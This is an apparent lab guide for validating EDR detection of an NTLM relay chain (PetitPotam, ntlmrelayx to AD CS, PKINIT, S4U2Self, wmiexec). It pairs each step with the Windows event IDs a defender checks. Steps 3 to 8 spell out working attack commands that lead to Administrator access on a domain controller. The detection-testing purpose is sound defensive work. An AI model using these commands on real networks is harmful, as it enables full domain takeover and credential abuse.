# NTLM Relay Attack Verification Guide (Scenario 5)

## 1. 概述 (Overview)
本文件旨在指導測試人員在隔離 Lab 環境中重現 **NTLM Relay** 攻擊鏈，並驗證 EDR 系統的檢測能力。
此情境利用 **PetitPotam** 觸發 DC 認證，透過 **ntlmrelayx** 轉發至 AD CS 申請憑證，最終透過 **S4U2Self** 機制取得域管理權限。

**攻擊路徑**: 
`PetitPotam (Trigger) -> ntlmrelayx (Relay to AD CS) -> getTGT/PKINIT (TGT) -> getST (S4U2Self) -> DCSync/Admin Access`

## 2. 環境準備 (Prerequisites)
- **Attacker**: Kali Linux (安裝 Impacket, PetitPotam)
- **Target**: Windows Domain Controller (DC)
- **Service**: AD CS (Active Directory Certificate Services) 需啟用 Web Enrollment
- **Credential**: 一組有效的域用戶帳號密碼 (用於 PetitPotam 觸發)

## 3. 前提條件檢查 (Pre-flight Check)
[IMPORTANT] 在執行驗證前，必須確認以下稽核政策已啟用，否則無法產生驗證所需的 Event Logs。

| 檢查對象 | 檢查項目 | 驗證指令 / 路徑 | 關鍵 Event ID |
|---|---|---|---|
| **DC** | Audit Account Logon | `auditpol /get /category:"Account Logon"` | 4768, 4769 |
| **DC** | Audit Logon Events | `auditpol /get /category:"Logon/Logoff"` | 4624, 4648 |
| **DC** | Directory Service Access | `auditpol /get /subcategory:"Directory Service Access"` | 4662 |
| **DC** | Directory Service Replication | `auditpol /get /subcategory:"Directory Service Replication"` | 4928, 4929 |
| **CA Server** | AD CS Auditing | CA 管理介面 -> 內容 -> 稽核 | 4886, 4887 |
| **CA Server** | IIS Extended Protection | `reg query "HKLM\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters" /v "ExtendedProtection"` | Relay 失敗排查 |

## 4. 驗證執行步驟 (Validation Execution)

### Step 1: 基線確認 (DC / CA / EDR)
先確認 DC 與 CA 的稽核項目已啟用，並確認 EDR 已收集 Security Log 與 AD CS 相關日志。

### Step 2: 工具準備與環境設定
在攻擊機 (Kali Linux) 準備必要的工具和環境：
```bash
# 安裝必要工具（參考你們內部核准的安裝方法）
# Impacket: 用於 ntlmrelayx、getTGT、getST、wmiexec
# PetitPotam: 用於觸發強制認證

# 設定攻擊機監聽介面
ip addr show  # 確認攻擊機 IP
```

### Step 3: 啟動監聽與轉發 (Attacker)
在攻擊機上啟動 ntlmrelayx，監聽 SMB (445) 並轉發至 AD CS HTTP Endpoint。
```bash
# 請替換 <AD_CS_IP> 為實際 AD CS 伺服器 IP
# ntlmrelayx.py -t http://<AD_CS_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# 保持此視窗開啟，等待連線
```

### Step 4: 觸發 NTLM 認證 (Attacker)
開啟新視窗，使用 PetitPotam 強制 DC 向攻擊機發起 NTLM 認證。
```bash
# 語法: python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <ATTACKER_IP> <DC_IP>
# 範例:
# python3 PetitPotam.py -d contoso.com -u lowpriv -p Password123 192.168.1.100 192.168.1.10
# 執行成功後，Step 3 的視窗將截獲認證並顯示獲取的 Base64 憑證 (Certificate)
# 這會產生 Event 4648 (DC 機器帳號向攻擊機發起認證)
```

### Step 5: 提取並轉換憑證 (Attacker)
將 ntlmrelayx 輸出的 Base64 憑證內容存為 cert.b64，並轉換格式。
```bash
# 轉換為 PEM 格式 (假設私鑰已提取或由 ntlmrelayx 自動處理)
# 若 ntlmrelayx 直接輸出 .pfx 或 .ccache，請依據實際輸出調整
# 這裡假設使用 getTGT.py 需要的格式
# (註: 最新版 ntlmrelayx 通常會自動儲存憑證，請查看輸出目錄)
```

### Step 6: 執行 PKINIT 獲取 TGT (Attacker)
使用 DC 的機器帳號憑證申請 TGT。
```bash
# <DC_HOSTNAME> 為 DC 的機器名稱 (不含 $)
# python3 getTGT.py -cert-pem dc01.pem -key-pem dc01.key <DOMAIN>/<DC_HOSTNAME>$
# 設定環境變數以使用 TGT:
# export KRB5CCNAME=./<DC_HOSTNAME>$.ccache
# 這會產生 Event 4768 (PKINIT TGT 請求)
```

### Step 7: 執行 S4U2Self 權限提升 (Attacker)
利用 S4U2Self 機制，以 DC 機器帳號身分模擬 Administrator 獲取服務票證。
```bash
# python3 getST.py -k -spn cifs/<DC_FQDN> -impersonate Administrator <DOMAIN>/<DC_HOSTNAME>$
# export KRB5CCNAME=./Administrator.ccache
# 這會產生 Event 4769 (S4U2Self 服務票證請求)
```

### Step 8: 驗證存取 (Attacker)
使用模擬的 Administrator 票證訪問 DC，驗證權限。
```bash
# python3 wmiexec.py -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
# 這會產生對應的 4624、4672、4688 等事件
```

### Step 9: 現場核對與驗證
在每個步驟執行後，立即在對應系統核對事件記錄：
- DC: 檢查 Security Log 中對應 Event ID
- CA: 檢查 AD CS 稽核日志
- EDR: 確認事件收集和告警觸發狀況

## 5. 驗證對照表 (Verification Checklist)

請依序檢查 Event Viewer 或 EDR Console，確認以下事件是否被記錄。

### 階段 1: 觸發與認證 (PetitPotam / NTLM)
| Event ID | 來源 | 檢查重點 | 狀態 |
|---|---|---|---|
| **4648** | DC | `AccountName` 為 DC 機器帳號, `TargetServerName` 為攻擊機 IP（DC 被迫向攻擊機發起 NTLM 認證） | [ ] |
| **4624** | DC | `LogonType` 通常為 3 (Network) | [ ] |

### 階段 2: 憑證申請 (AD CS Abuse)
| Event ID | 來源 | 檢查重點 | 狀態 |
|---|---|---|---|
| **4886** | CA | 憑證服務收到憑證申請 | [ ] |
| **4887** | CA | 憑證已核發，檢查 Requester 為 DC 機器帳號（格式：`DOMAIN\\DC$`） | [ ] |

### 階段 3: Kerberos PKINIT (TGT Request)
| Event ID | 來源 | 檢查重點 | 狀態 |
|---|---|---|---|
| **4768** | DC | TGT 請求成功, **`PreAuthType` = 16** (DT_PKINIT) | [ ] |

### 階段 4: S4U2Self (Privilege Escalation)
| Event ID | 來源 | 檢查重點 | 狀態 |
|---|---|---|---|
| **4769** | DC | 服務票證請求，**`TransitedServices` 不為空**；`ServiceName` 為 DC 的 CIFS SPN；`AccountName` 為 DC 機器帳號（非人類帳號） | [ ] |

### 階段 5: 最終存取 (Admin Access)
| Event ID | 來源 | 檢查重點 | 狀態 |
|---|---|---|---|
| **4624** | DC | Administrator 登入成功 | [ ] |
| **4672** | DC | Administrator 特權指派 | [ ] |
| **4688** | DC | 可疑遠端管理相關進程建立 | [ ] |
| **4662** | DC | 目錄存取/複寫操作，檢查 `1131f6aa`、`1131f6ad` GUID | [ ] |

## 6. 常見問題排除
1. **沒有產生 4886/4887 事件**: 
   - 檢查 CA Server 是否開啟稽核: `certsrv.msc` -> 右鍵 CA 名稱 -> 內容 -> 稽核 -> 勾選所有項目。
   - 啟用後需重啟 AD CS 服務。
2. **Event 4768/4769 沒出現**:
   - 確認 DC 的 Group Policy 中 `Audit Kerberos Authentication Service` 和 `Audit Kerberos Service Ticket Operations` 已啟用。
3. **ntlmrelayx 連接失敗**:
   - 確認 AD CS 網頁註冊功能 (Web Enrollment) 已安裝且路徑正確 (`/certsrv/certfnsh.asp`)。
4. **AD CS Relay 一直失敗**:
   - 檢查 CA/IIS 是否啟用 Extended Protection for Authentication (EPA)。
   - 若已啟用 EPA，Relay 可能被阻擋，需改走其他經核准測試路徑。
5. **4662 沒出現（DCSync 無記錄）**:
   - 確認已啟用 `Directory Service Access` 稽核。
   - 確認 DC 上對 `domainDNS` 物件已配置對應 SACL（否則不會產生 4662）。
   - 可用 `auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable` 重新啟用後再測。